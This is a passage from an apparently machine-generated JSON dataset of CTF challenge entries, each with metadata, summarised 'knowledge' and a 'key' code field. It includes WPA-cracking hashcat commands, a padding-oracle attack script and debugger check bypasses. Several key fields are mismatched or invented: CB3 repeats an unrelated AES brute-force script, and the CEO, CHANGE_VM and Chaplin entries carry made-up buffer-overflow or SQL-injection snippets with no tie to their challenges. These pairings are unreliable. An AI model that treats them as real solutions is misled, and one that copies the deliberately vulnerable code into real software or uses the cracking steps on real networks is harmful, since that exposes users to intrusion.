            "In challenges involving audio files that hint at encryption methods (like the mention of a numbers station or specific codewords), transcribe the audio to text and analyze it for patterns or clues. The use of the NATO Phonetic Alphabet usually suggests an initial layer of decryption to convert words into letters. Following this, additional hints (such as a mentioned shift number or codeword) may suggest further classic cipher techniques, including but not limited to Caesar Cipher, Polybius Square, or Vigen\u00e8re Cipher. Tools like dcode.fr or cryptii.com can assist in decrypting these with the provided clues.\n   - Example scenario: An audio message uses the NATO Phonetic Alphabet followed by a numerical shift hint. After converting to letters, apply the Caesar Cipher shift using online tools like dcode.fr to decrypt.",
            "For encrypted data that does not immediately appear to be plaintext or follows a complex encryption pattern, consider the context and hints provided within the challenge description for potential decryption methods. This can include multi-step decryption processes where initial decryption (e.g., Base64) reveals data that must be further decoded using other methods (e.g., XOR with a specific key, followed by Vigen\u00e8re Cipher). Such challenges may require iterative decryption using various keys and methods hinted at in the challenge's text.\n   - Example scenario: Encrypted data ends with '=', suggesting Base64 encoding. Upon decoding, if the result isn't plaintext, analyze hints for subsequent decryption steps, such as XOR with a key derived from the challenge text, followed by decryption with another method like the Vigen\u00e8re Cipher using a contextually relevant key."
        ],
        "key": "```python\nfrom Crypto.Cipher import AES  \nimport itertools  \nimport string  \ngoal = 'f312cf9c53af89447e652e73b9754a0c'\n//asdfasdfasdfasdf encoded using their key  \nfor combo in itertools.product(string.letters, repeat = 2):     //bash all\ncombinations of two letters (16 bit)  \n\tkey = ''.join(combo) * 8                                //AES-128 requires a 16 byte key, so hopefully the key is just 8 of the 16 bit key.  \n\tcipher = AES.new(key, AES.MODE_ECB)  \n\tmsg = cipher.encrypt('asdfasdfasdfasdf')  \n\tif msg.encode('hex') == goal:  \n\t\tprint key  \n\t\tbreak  \n```"
    },
    {
        "name": "CB3",
        "write_up": "dataset/raw/CB3.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2019",
            "https://ctftime.org/event/767/tasks/"
        ],
        "score": 150,
        "max_score": 350,
        "difficulty": 0.42857142857142855,
        "knowledge": [
            "When encountering ciphers that seem to involve a fixed rotation of characters, such as ROT47, one can leverage online decoders or scripts to decipher the text. These tools are widely available and can handle a variety of rotation-based ciphers, making them invaluable for quickly cracking simple encoded messages. For a ROT47 example, a direct input into an online ROT47 decoder will yield the plaintext.",
            "For ciphers mentioned within audio files or similar mediums where information is given in a less straightforward manner, such as the usage of the NATO Phonetic Alphabet or distinctive patterns indicating a specific cipher (e.g., a limited character set suggesting a Polybius square cipher), the initial step is transcription followed by applying the hinted-at cipher technique. For a NATO Phonetic Alphabet encoded message hinting at a Caesar Cipher, transcribe the phonetic elements to letters, then use an appropriate Caesar Cipher decoder with the suggested shift, e.g., a shift of 6. For a message hinting at a Polybius square cipher due to a limited character set, utilize online tools or scripts to decode after determining the key and the structure of the square, such as excluding 'J' and using a distinctive codeword as the key.\n   \nExample payload for NATO Phonetic Alphabet decoded then shifted by Caesar Cipher:\n```\nTranscribed message: HKCGXKZNKOJKYULSGXIN\nDecoded with shift 6: bewaretheidesofmarch\n```"
        ],
        "key": "```python\nfrom Crypto.Cipher import AES  \nimport itertools  \nimport string  \ngoal = 'f312cf9c53af89447e652e73b9754a0c'\n//asdfasdfasdfasdf encoded using their key  \nfor combo in itertools.product(string.letters, repeat = 2):     //bash all\ncombinations of two letters (16 bit)  \n\tkey = ''.join(combo) * 8                                //AES-128 requires a 16 byte key, so hopefully the key is just 8 of the 16 bit key.  \n\tcipher = AES.new(key, AES.MODE_ECB)  \n\tmsg = cipher.encrypt('asdfasdfasdfasdf')  \n\tif msg.encode('hex') == goal:  \n\t\tprint key  \n\t\tbreak  \n```"
    },
    {
        "name": "CEO",
        "write_up": "dataset/raw/CEO.md",
        "type": "misc",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "To crack Wi-Fi passwords from a pcap file in CTF challenges, first convert the pcap file into the hccapx format using an online converter or the cap2hccapx tool from hashcat-utils for privacy-sensitive situations. This step prepares the file for the password cracking process with hashcat. Sample command for conversion (offline tool): `cap2hccapx.bin megacorp-01.cap wifi.hccapx`.",
            "Utilize hashcat with a well-known password dictionary like rockyou.txt to attempt cracking the converted hccapx file. The command `-m 2500` specifies the hash mode for WPA/WPA2, which is applicable when dealing with Wi-Fi handshake files. Sample command for cracking: `hashcat -m 2500 wifi.hccapx rockyou.txt --show`."
        ],
        "key": "```c\n// Possible vulnerable code snippet based on context\n#include <stdio.h>\n#include <string.h>\n\nvoid check_password(char *input) {\n    char password[20];\n    strcpy(password, \"nanotechnology\"); // Vulnerable to buffer overflow\n    if (strcmp(input, password) == 0) {\n        printf(\"Access granted.\\n\");\n    } else {\n        printf(\"Access denied.\\n\");\n    }\n}\n\nint main() {\n    char user_input[50];\n    printf(\"Enter password: \");\n    gets(user_input); // Vulnerable to buffer overflow\n    check_password(user_input);\n    return 0;\n}\n```"
    },
    {
        "name": "cerberus",
        "write_up": "dataset/raw/cerberus.md",
        "type": "crypto",
        "competition": [
            "SECCON/2021",
            "https://ctftime.org/event/1458/tasks/"
        ],
        "score": 227,
        "max_score": 428,
        "difficulty": 0.530373831775701,
        "knowledge": [
            "When dealing with CBC mode encryption challenges, a padding oracle attack can be effectively utilized to decrypt ciphertext without the need for the encryption key. This process involves manipulating the IV and ciphertext in such a way that one can recover plaintext by querying the decryption oracle and observing its response to padding errors. Specifically, by appending a controlled input (Cr) after the ciphertext and IV, adjusting this input based on the decryption oracle's feedback allows for the gradual revelation of the plaintext. This technique exploits the property of CBC mode where the decryption of a block is XORed with the previous ciphertext block (or IV for the first block) to produce the original plaintext.",
            "To construct a decryption oracle from scratch in scenarios where the encryption service does not directly provide one, one can manipulate the IV to control the output of the decryption process. By carefully crafting a new IV (`new_IV = IV ^ PIV`, where `PIV` is derived from the padding oracle attack), it's possible to force the decryption process to output as if it were decrypting with the original IV, thus effectively turning the service into a decryption oracle. This approach allows for the decryption of arbitrary ciphertexts by submitting them along with the crafted IV to the service and applying the decryption oracle in a padding oracle attack fashion to recover the plaintext.\n\nExample payloads cannot be directly derived from this explanation as it requires the context of the target encryption system and its responses to craft the payload based on observed outputs."
        ],
        "key": "```python\ndef spell(iv, c):  \n\tassert len(iv) == 0x10 and len(c) % 0x10 == 0  \n\tsh.sendline(b64encode(iv + c))  \n\tret = sh.recvuntil(b'\\n')  \n\tassert not ret.startswith(b\"Grrrrrrr!!!!\")  \n\tret = ret.startswith(b\"Great :)\") # return true for success decryption  \n\tsh.recvuntil(b\"spell:\")  \n\treturn ret\n\ndef padding_oracle(ct_to_break, iv):  \n\tprev_out = [None] * 16  \n\tcr = [0x41] * 16  \n\tfor i in range(0, 16):  \n\t\tfor c in range(0, 0x100):  \n\t\t\tcr[15-i] = c  \n\t\t\tif spell(iv, ct_to_break + bytes(cr) * 2):  \n\t\t\t\tfor j in range(0, i+1):  \n\t\t\t\t\tcr[15-j] ^= (i+1) ^ (i+2)  \n\t\t\t\tprev_out[15-i] = c ^ (i+1)  \n\t\t\t\tbreak  \n\treturn prev_out\n```"
    },
    {
        "name": "Cereal Killer 01",
        "write_up": "dataset/raw/Cereal Killer 01.md",
        "type": "The type of this CTF challenge is **reverse**.",
        "competition": [
            "DEADFACE/2023",
            "https://ctftime.org/event/2031/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When encountering a binary that decrypts and prints a flag based on input validation, analyze the program's flow to manipulate the validation check. This can be achieved by using a debugger to set the condition-checking register to a value that bypasses the input validation, thereby forcing the program to execute the block of code that reveals the flag. This technique is particularly useful when direct modification of input is not feasible due to complex validation mechanisms or when the input's correct value is unknown. \n   - Sample technique using GDB: \n     ```\n     gef> set $eax=0\n     gef> continue\n     ```\n   This sets the result of the comparison (typically stored in the `eax` register on x86 architectures) to 0 (indicating success in most C comparisons), bypassing the need to meet the actual condition.",
            "For obfuscated or encrypted strings within a binary that are decrypted or manipulated at runtime based on certain conditions, static analysis alone may not be sufficient to reveal the value. Running the binary within a debugger, dynamically altering the flow to bypass checks, and observing the memory or register states can unmask such strings. In some cases, manual intervention in the program's execution flow via debugger commands allows analysts to directly access the decryption or manipulation routines, making the reverser's task easier. \n   - As shown in the solution, manipulating the program's execution just after a key comparison (`memcmp` in this case) and before the conditional jump that depends on this comparison can allow the execution of the desired code block that handles decryption or printing of hidden information."
        ],
        "key": "```c\np_flag = \"I&_9a%mx_tRmE4D3DmYw_9fbo6rd_aFcRbE,D.D>Y[!]!\\'!q\";  \nputs(\"Bumpyhassan loves Halloween, so naturally, he LOVES SPOOKY CEREALS!\");  \nputs(\"He also happens to be a fan of horror movies from the 1970\\'s to the 1990\\'s.\");  \nprintf(\"What is bumpyhassan\\'s favorite breakfast cereal? \");  \nfgets(bf,0xfff,_stdin);  \nfor (p_bf = bf; *p_bf != '\\0'; p_bf = p_bf + 1) {  \n  *p_bf = *p_bf + '\\a';  \n}  \n*p_bf = '\\0';  \ncheck = memcmp(&DAT_00012039,bf,14);  \nif (check == 0) {  \n  puts(\"You are correct!\");  \n  i = flag;  \n  for (; *p_flag != '\\0'; p_flag = p_flag + 2) {  \n    *i = *p_flag;  \n    i = i + 1;  \n  }  \n  *i = '\\0';  \n  printf(\"flag{%s}\\n\",flag);  \n}  \nelse {  \n  puts(\"Sorry, that is not bumpyhassan\\'s favorite cereal. :( \");  \n}  \n```"
    },
    {
        "name": "Chad _The Jaw_ Bronson",
        "write_up": "dataset/raw/Chad _The Jaw_ Bronson.md",
        "type": "misc",
        "competition": [
            "BYUCTF/2022",
            "https://ctftime.org/event/1660/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When encountering challenges that integrate steganography with social media platforms for clues, it is important to analyze media files (e.g., audio) for hidden messages that could direct to social media profiles. These profiles may contain further hints or data crucial for progressing in the challenge. Utilizing spectrogram views on audio files can reveal hidden text or clues that are not immediately apparent through listening alone.",
            "For text-based puzzles that involve a sequence of repetitive phrases or patterns, consider applying classical cipher techniques. In scenarios where the puzzle presents structured text repetition, the a1z26 cipher (where numbers are substituted for letters of the alphabet) can be an effective method for decoding messages. The decoded message may serve as a key or password in subsequent steps of the challenge, such as unlocking password-protected archives. \n   \n   Example decoded message: `iamthechaddest213`"
        ],
        "key": "```python\ndef check_password(input_password):\n    correct_password = \"iamthechaddest213\"\n    if input_password == correct_password:\n        return \"Access Granted\"\n    else:\n        return \"Access Denied\"\n\n# Example of vulnerable code\nuser_input = input(\"Enter the password: \")\nprint(check_password(user_input))\n```\n"
    },
    {
        "name": "CHANGE_VM",
        "write_up": "dataset/raw/CHANGE_VM.md",
        "type": "reverse",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": 347,
        "max_score": 500,
        "difficulty": 0.694,
        "knowledge": [
            "When dealing with binaries that involve complex calculations or virtual machines (VMs) to validate input, symbolic execution tools like angr can be applied to automate the extraction of correct inputs or passwords without manually reverse engineering the binary's logic. This method involves creating a symbolic file (with a symbolic size if necessary), simulating user input, and then exploring execution paths to find a state where the output indicates success (e.g., a message about a correct password).\n\nExample of using angr for automated password extraction:\n```python\nimport angr\nimport claripy\n\n# Load the binary\np = angr.Project(\"binary_name\")\n\n# Create a symbolic buffer of the expected input length\nsymsize = claripy.BVS('inputLength', 64)  # Adjust the size as necessary\nsimfile = angr.SimFile('/dev/stdin', size=symsize)\n\n# Create an entry state with the symbolic file as stdin\nstate = p.factory.entry_state(stdin=simfile)\n\n# Setup a simulation manager\nsimgr = p.factory.simulation_manager(state)\n\n# Explore the binary looking for a state that prints \"Good password\" or similar success message\nsimgr.explore(find=lambda s: b\"Good\" in s.posix.dumps(1))\n\n# Extract and print the found state and the correct input\nif simgr.found:\n    found_state = simgr.found[0]\n    print((b\"Correct Input: \" + found_state.posix.dumps(0)).decode())\n```",
            "For challenges involving SystemVerilog files that describe state machines, mapping the transitions and conditions between states can allow the construction of input sequences (flags). This method involves parsing the SystemVerilog file to identify conditions for state transitions and then either traversing the states forward or backward (depending on the challenge setup) to reconstruct the sequence of inputs ('di') that lead to the solution state.\n\nExample approach for mapping and traversing state transitions in SystemVerilog challenges:\n```python\n# Pseudo-code for extracting state transition conditions and traversing the map\nentries = {}\n\n# Parse the SystemVerilog file to fill the 'entries' dictionary with state transitions\n# This would usually involve reading lines, identifying the transition conditions, and mapping them accordingly\n\ndef traverse_states_to_construct_flag(initial_state, target_state):\n    current_state = initial_state\n    flag_parts = []\n    while current_state != target_state:\n        # Assuming 'entries' maps current_state to a tuple of (next_state, input_required_for_transition)\n        next_state, input_char = entries[current_state]\n        flag_parts.append(input_char)\n        current_state = next_state\n    return ''.join(flag_parts)\n\n# Example call to the function (parameters like initial_state and target_state would be challenge-specific)\nflag = traverse_states_to_construct_flag(0, solution_state)\nprint(f\"Flag: {flag}\")\n```\n\nThese approaches abstractly cover tackling challenges involving binary analysis with virtual machines and signal or state-driven logic in hardware description languages, providing strategies that can be tailored to specific CTF challenges."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint check_password(char *input) {\n    char password[41];\n    strcpy(password, input); // Vulnerable to buffer overflow\n    // Some complex logic to verify password\n    if (strcmp(password, \"correct_password\") == 0) {\n        return 1; // Good password\n    }\n    return 0; // Bad password\n}\n\nint main() {\n    char input[50];\n    printf(\"Please enter the password: \");\n    fgets(input, 50, stdin);\n    if (check_password(input)) {\n        printf(\"Good password. Congratulations!\\n\");\n    } else {\n        printf(\"Bad password. Try again.\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "Chaos",
        "write_up": "dataset/raw/Chaos.md",
        "type": "crypto",
        "competition": [
            "ISITDTU/2019/Quals",
            "https://ctftime.org/event/803/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with pseudo-substitution ciphers in a CTF challenge, observe the length and characters within each ciphered segment to deduce the plaintext mapping rules. This approach is effective when the encryption mechanism uses varied lengths and character sets to represent different types of plaintext characters (e.g., lowercase, uppercase, numbers, punctuation). The decryption process requires identifying the consistent positioning of the plaintext character within its ciphered equivalent, taking into account its length and the presence of specific character types. This method is especially useful when traditional frequency analysis is not applicable due to the uniqueness of each ciphered letter's representation.\n   \n   Example decryption pattern (pseudo-code):\n   ```python\n   for each ciphered_character in ciphertext:\n       if length_of(ciphered_character) == condition1:\n           decrypted_message += decipher_logic1\n       elif length_of(ciphered_character) == condition2 and specific_character_in(ciphered_character):\n           decrypted_message += decipher_logic2\n       ...\n       else:\n           decrypted_message += default_decipher_logic\n   ```",
            "In crypto challenges, especially those involving custom or modified encryption techniques, scripting an exploit based on the observed behavior of the tool can significantly automate and speed up the decryption process. Developing a script that programmatically applies identified patterns to decrypt messages or generate keys can bypass manual analysis and directly output the flag. This approach necessitates understanding how the cipher operates through interaction (e.g., encrypting and decrypting known samples) to reverse-engineer its underlying logic. \n\n   Example approach for scripting an exploit:\n   - Identify patterns through interaction with the encryption tool (e.g., how different character types are encrypted).\n   - Code the observed patterns into a decryption script.\n   - Use the script to decrypt provided ciphertexts or to create keys that satisfy the challenge conditions.\n\n   Note: While a specific code example here would be overly context-specific and hence not universally applicable, the general approach involves looping through encrypted data, applying conditional checks, and concatenating results based on the identified encryption pattern."
        ],
        "key": "```python  \npt = \"\"  \nfor c in ct:  \n   if len(c) == 8:  \n       pt += c[0]  \n   elif len(c) == 11 and c[6] in punctuation:  \n       pt += c[3]  \n   elif len(c) == 11 and c[6] in ascii_uppercase:  \n       pt += c[7]  \n   else:  \n       pt += c[-1]  \n```"
    },
    {
        "name": "Chaplin's PR Nightmare - 1",
        "write_up": "dataset/raw/Chaplin's PR Nightmare - 1.md",
        "type": "This write-up describes an OSINT (Open-source intelligence) challenge where the participants had to find Charlie Chaplin's Twitter account and investigate it to find the flag. Based on the context provided, the type of this challenge is **miscellaneous (misc)**.",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When investigating digital footprints on social platforms like Twitter for OSINT (Open Source Intelligence) purposes, combining known information (e.g., full name, profession, or interests) with specific platform functionalities (like search filters) enhances the accuracy of search results. This approach can narrow down potentially overwhelming data to locate target profiles or information more efficiently. For instance, using key terms related to the subject's professional background in the search query can be effective.\n   - Sample search query: \"Charlie Chaplin coding\"",
            "Social media platforms often have unique features or less commonly used functionalities, such as Twitter's \"lists,\" which can be exploited during an OSINT investigation to uncover hidden or not immediately apparent information. Accessing and reviewing these can reveal details such as interests, affiliations, or, in the context of CTF challenges, hidden flags. Knowing how to navigate through these platform-specific features can unveil crucial information that is not visible at first glance.\n   - Sample action: On Twitter, navigate to a user's profile > click on the options button > select \"View Lists\""
        ],
        "key": "```python\ndef search_twitter_profiles(name, keywords):\n    # Simulate a search function that could be vulnerable to injection\n    query = f\"SELECT * FROM profiles WHERE name='{name}' AND keywords LIKE '%{keywords}%'\"\n    # Execute the query (vulnerable to SQL injection)\n    results = execute_query(query)\n    return results\n\n# Example usage\nprofiles = search_twitter_profiles(\"charlie chaplin\", \"coding\")\n```"
    },
    {
        "name": "cheapest-cookies-2",
        "write_up": "dataset/raw/cheapest-cookies-2.md",
        "type": "misc",
        "competition": [
            "TJCTF/2022",
            "https://ctftime.org/event/1599/tasks/"
        ],
        "score": 253,
        "max_score": 500,
        "difficulty": 0.506,
        "knowledge": [
            "For challenges requiring finding the shortest path within a graph, Dijkstra's algorithm is highly effective, especially in situations involving non-negative weights and the need to calculate single-source shortest paths. This approach is practical when the constraints permit holding all nodes and edges in memory and when the graph doesn't have negative weight cycles, as Dijkstra's algorithm does not work correctly under such conditions.",
            "In challenges where you need to interact with a server to provide inputs and receive outputs dynamically, `pwntools` can be used efficiently for network interactions. This library simplifies sending and receiving data, making it particularly useful for CTF challenges where quick and automated communication with a remote server is required to solve a problem or exploit a vulnerability.\n   \n   Example usage:\n   ```python\n   from pwn import remote\n   \n   target = remote('target.address.com', port_number)\n   received = target.recvuntil(b'prompt')\n   # Process received data or calculate response\n   response = 'calculated_response'\n   target.sendline(bytes(response, 'ascii'))\n   # Continue to interact as necessary\n   ```\n\nThese principles can be broadly applied across various CTF challenges and similar scenarios that require algorithmic problem-solving involving graphs or network-based interactions."
        ],
        "key": "```python\ndef calculate_path(edges):  \n   # each node has [distance, prev_node, visited]  \n   # for node 0  \n   distance = [[0, 0, True]]\n\n   # initialize 20 other nodes  \n   for i in range(20):  \n       distance.append([1000, -1, False])\n\n   # source node  \n   src = 0\n\n   # priority queue for the closest node  \n   closest = []\n\n   while len(edges) != 0:  \n       # loop through all edges for each node  \n       i = 0  \n       while i != len(edges):  \n           # parse the edge data  \n           edge = edges[i].split(' ')  \n           first = int(edge[0])  \n           second = int(edge[1])  \n           weight = int(edge[2])\n\n           other = -1\n\n           # if the current edge has an end touching the src node  \n           if first == src:  \n               other = second\n\n           elif second == src:  \n               other = first\n\n           else:  \n               # nothing to be done - move to next edge  \n               i += 1  \n               continue\n\n           # process the edge  \n           # remove from the list to avoid reading it twice  \n           edges.pop(i)  \n  \n           # skip the node if visited - shortest path already found  \n           if distance[other][2] == True:  \n               continue\n\n           # update the shortest path  \n           if distance[other][0] > (distance[src][0] + weight):  \n               distance[other][0] = distance[src][0] + weight  \n               distance[other][1] = src\n\n               # add to the queue  \n               if not closest:  \n                   closest.append([distance[other][0], other])  \n               else:  \n                   j = 0  \n                   while j != len(closest):  \n                       if distance[other][0] < closest[j][0]:  \n                           break   \n                       else:  \n                           j += 1  \n                   closest.insert(j, [distance[other][0], other])\n\n       # no more reachable nodes   \n       if not closest:  \n           break\n\n       # pop the closest node to node #0  \n       next_src = closest.pop(0)  \n       src = next_src[1]\n\n       # shortest path to 20 is found - no need to keep going  \n       if src == 20:  \n           return distance[20][0]  \n           break\n\n       # mark node as visited  \n       distance[src][2] = True\n\n   if distance[20][0] == 1000:  \n       # node 20 is unreachable  \n       return -1  \n   else:  \n       return distance[20][0]\n```"
    },
    {
        "name": "cheater mind",
        "write_up": "dataset/raw/cheater mind.md",
        "type": "misc",
        "competition": [
            "Zh3r0/2021",
            "https://ctftime.org/event/1285/tasks/"
        ],
        "score": 997,
        "max_score": 997,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with CTF challenges that have an element of unpredictability or mutation in their feedback mechanism, genetic algorithms can be an effective approach. Genetic algorithms are capable of handling unreliable feedback by constantly evolving the solutions based on the feedback received, even when it may contain inaccuracies. This approach is particularly useful in scenarios where the feedback mechanism is designed to mislead or where there is a degree of randomness involved.",
            "To effectively utilize a genetic algorithm in a CTF challenge, especially when dealing with problems like an unreliable or tampered feedback system, it is crucial to tweak the parameters and the evolution loop of the algorithm to better suit the challenge's specific conditions. Adjusting these parameters can significantly enhance the algorithm's ability to converge on the correct solution despite the unreliable feedback. This might involve changing the mutation rates, selection process, or the fitness function to adapt to the peculiarities of the challenge's feedback mechanism. \n\nSample payload or mutation adjustment might look like this in pseudocode:\n```\nmutation_rate = 0.05  # Adjust based on feedback reliability\nwhile not solved:\n    guesses = evolve_guesses_based_on_feedback(previous_guesses, mutation_rate)\n    feedback = submit_guesses(guesses)\n    if feedback indicates success:\n        solved = true\n```"
        ],
        "key": "```python\nfrom random import randint, random  \nfrom collections import Counter\n\nclass Agent:  \n   def __init__(self, N, K, mutation, guess_limit):  \n       self.N = N  \n       self.K = K  \n       self.mutation = mutation  \n       self.guess_limit = guess_limit  \n       self.secret = [randint(1, N) for i in range(K)]  \n       print(f\"secret = {self.secret}\")\n\n   def play(self, guess):  \n       if guess == self.secret:  \n           return self.K, 0\n\n       # This is where the server tampers with the values  \n       mutated = [  \n           i if random() > self.mutation else randint(1, self.N) for i in self.secret  \n       ]\n\n       bulls = sum(a == b for a, b in zip(mutated, guess))  \n       cows = Counter(mutated) & Counter(guess)  \n       return bulls, sum(cows.values()) - bulls\n\n   def game(self):  \n       try:  \n           for guess_no in range(self.guess_limit):  \n               guess = list(  \n                   map(  \n                       int,  \n                       input(\"enter your guess as space separated integers:\\n\")  \n                       .strip()  \n                       .split(),  \n                   )  \n               )  \n               bulls, cows = self.play(guess)  \n               print(bulls, cows)  \n               if bulls == self.K:  \n                   return True  \n           return False  \n       except:  \n           print(\"Error, exiting\")  \n           exit(1)\n\n# N, K, mutation, guess_limit  \n# First three rounds are just normal Mastermind games.  \n# Last three rounds have a small probability of mutation, providing unreliable  \n# feedback.  \nLEVELS = [  \n   [6, 6, 0, 7],  \n   [8, 6, 0, 8],  \n   [8, 8, 0, 9],  \n   [6, 6, 0.05, 10],  \n   [8, 6, 0.05, 11],  \n   [6, 6, 0.1, 12],  \n]\n\nprint(  \n   \"\"\"Can you beat me at mastermind when I am not so honest?  \nhttps://en.wikipedia.org/wiki/Mastermind_(board_game)\"\"\"  \n)\n\nfor level, (N, K, mutation, guess_limit) in enumerate(LEVELS, start=1):  \n   print(  \n       \"Level {}, N={}, K={}, mutation={}, guess limit={}\".format(  \n           level, N, K, mutation, guess_limit  \n       )  \n   )  \n   if Agent(N, K, mutation, guess_limit).game():  \n       print(\"level passed, good job\")  \n   else:  \n       print(\"You noob, try again\")  \n       exit(1)\n\nfrom secret import flag  \nprint(\"you earned it :\", flag)  \n```"
    },
    {
        "name": "Child Encrypter",
        "write_up": "dataset/raw/Child Encrypter.md",
        "type": "crypto",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 598,
        "max_score": 906,
        "difficulty": 0.6600441501103753,
        "knowledge": [
            "When dealing with encryption algorithms like AES in CTR mode with nonce, identify unique characteristics within the ciphertext to differentiate between blocks encrypted using different nonces or keys. Specifically, for ASCII plaintext, leverage the fact that the 8th bit is typically unset to group blocks encrypted with the same key or nonce. This approach assists in reducing the complexity of decrypting the message by narrowing down the possible nonce or key variations for each block.",
            "For a known-plaintext attack, especially in encrypted text following a predictable format (like the flag format \"Defenit{...}\"), utilize portions of the known plaintext to decrypt blocks with similar encryption parameters. XORing a ciphertext block with its corresponding plaintext reveals parts of the encryption key or nonce, which can then be used to decrypt other blocks encrypted under the same parameters. Repeating this process across different blocks and applying logical guesses for the plaintext can progressively reveal more of the key or nonce, eventually allowing for the decryption of the entire ciphertext.\n\nSample of payload for known-plaintext attack:\n```php\n$key_guess = \"Defenit{\\0\\0\\0\\0\\0\\0\\0\\0\"; // Known beginning of the plaintext\n$block_a = hex2bin('7a3a2828612a4f1a0700706f70756c61'); // Sample hex of block 'a'\n$block_b = hex2bin('2020616e64206d6f737420706f70756c'); // Sample hex of block 'b' known or guessed plaintext\n$derived_key = $block_a ^ $block_b ^ $key_guess;\necho bin2hex($derived_key);\n```"
        ],
        "key": "```c\nchar block[0x10];\nchar *end = buffer + size;\nint i = 0x10;\n\nwhile(buffer != end) {\n\tif(0x10 == i) {\n\t\tmemcpy(block, nonce, sizeof(block));\n\t\tblock[0x0F] = rand() % 10;\n\n\t\taes_encrypt(block, state);\n\t\ti = 0;\n\t}\n\n\t*buffer ^= block[i];\n\n\ti++;\n\tbuffer++;\n}\n```"
    },
    {
        "name": "child-re",
        "write_up": "dataset/raw/child-re.md",
        "type": "crypto",
        "competition": [
            "WolvCTF/2023",
            "https://ctftime.org/event/1866/tasks/"
        ],
        "score": 100,
        "max_score": 700,
        "difficulty": 0.14285714285714285,
        "knowledge": [
            "When encountering a binary in reverse engineering challenges that contains functions which are not called within the main program flow, manually inspect these functions for any operations on hardcoded data, such as XORing values or manipulating strings. These operations often relate to decrypting or obfuscating the flag. This knowledge is applicable in scenarios involving binary analysis and reverse engineering tasks where the goal is to extract hidden or encrypted information.",
            "In reverse engineering challenges, if an encoded or encrypted string is found within the binary, attempt to apply common cryptographic operations like XOR with commonly known values or brute-force with a range of possible values to decode the string. This approach is particularly useful when references or hints towards a specific value (such as the value `0x42` mentioned in a Hitchhiker's Guide to the Galaxy reference) are present within the challenge or its documentation.\n\nExample of applying the XOR operation:\n```python\nenc_flag = bytes.fromhex('5d495e4c51621b5e4942421b4119581f756d5f1b4e19755e1a755e4219756d1e461e52530b0b751e1857')\nfor c in enc_flag:\n    print(end=chr(c ^ 42))\nprint()\n```"
        ],
        "key": "```c\nvoid hidden_function() {\n    unsigned char enc_flag[] = {0x5d, 0x49, 0x5e, 0x4c, 0x51, 0x62, 0x1b, 0x5e, 0x49, 0x42, 0x42, 0x1b, 0x41, 0x19, 0x58, 0x1f, 0x75, 0x6d, 0x5f, 0x1b, 0x4e, 0x19, 0x75, 0x5e, 0x1a, 0x75, 0x5e, 0x42, 0x19, 0x75, 0x6d, 0x1e, 0x46, 0x1e, 0x52, 0x53, 0x0b, 0x0b, 0x75, 0x1e, 0x18, 0x57};\n    for (int i = 0; i < sizeof(enc_flag); i++) {\n        enc_flag[i] ^= 0x42;\n    }\n    printf(\"%s\\n\", enc_flag);\n}\n```"
    },
    {
        "name": "chunk norris",
        "write_up": "dataset/raw/chunk norris.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2020",
            "https://ctftime.org/event/1041/tasks/"
        ],
        "score": 98,
        "max_score": 474,
        "difficulty": 0.20675105485232068,
        "knowledge": [
            "When faced with an RSA encryption challenge involving a custom prime number generation function, closely analyzing the algorithm used for prime generation can reveal weaknesses in how the primes are generated. This can allow for the reconstruction of the prime factors if the algorithm produces predictable or insufficiently random outcomes. This approach involves understanding the mathematical relationship between the generated primes and their initial parameters, using the structure of the primes to approximate initial seeds or parameters, and then factoring the derived approximations to find potential prime candidates.",
            "For RSA challenges where prime numbers are generated using a linear congruential generator or a similar predictable mathematical function, one can exploit the predictability of prime generation to compute possibilities for the seed or the intermediate values used in the generation process. This involves reverse engineering the prime generation to an extent where enough information about the seed or intermediate values is known to attempt factoring the RSA modulus \\(n\\). Specific mathematical operations, like calculating the least significant bits of the product of two numbers or using modular inverses, can lead to narrowing down potential seeds or intermediate values that, when factored, yield the private primes \\(p\\) and \\(q\\).\n\n    - Example method to approximate intermediate values: Given \\(n = pq\\), where \\(p\\) and \\(q\\) are primes generated by a predictable process, approximate the seeds (\\(s_1\\) and \\(s_2\\)) used to generate \\(p\\) and \\(q\\) by computing \\((n \\mod 2^{64}) \\times \\text{inverse}(a^{30}, 2^{64}) \\mod 2^{64}\\) for the least significant bits and \\(n // 2^{1920}\\) for the most significant bits approximation, where \\(a\\) is a known multiplier in the generation process. These approximations can lead to finding \\(s_1 \\times s_2\\), which can then be factored to find potential values for \\(s_1\\) and \\(s_2\\), subsequently used to regenerate \\(p\\) and \\(q\\) and solve the RSA challenge."
        ],
        "key": "```python\n#!/usr/bin/python3 -u\n\nimport random  \nfrom Crypto.Util.number import *  \nimport gmpy2\n\na = 0xe64a5f84e2762be5  \nchunk_size = 64\n\ndef gen_prime(bits):  \n s = random.getrandbits(chunk_size)\n\n while True:  \n   s |= 0xc000000000000001  \n   p = 0  \n   for _ in range(bits // chunk_size):  \n     p = (p << chunk_size) + s  \n     s = a * s % 2**chunk_size  \n   if gmpy2.is_prime(p):  \n     return p\n\nn = gen_prime(1024) * gen_prime(1024)  \ne = 65537  \nflag = open(\"flag.txt\", \"rb\").read()  \nprint('n =', hex(n))  \nprint('e =', hex(e))  \nprint('c =', hex(pow(bytes_to_long(flag), e, n)))  \n```"
    },
    {
        "name": "Chunkies",
        "write_up": "dataset/raw/Chunkies.md",
        "type": "forensics",
        "competition": [
            "Shakti/2021",
            "https://ctftime.org/event/1251/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
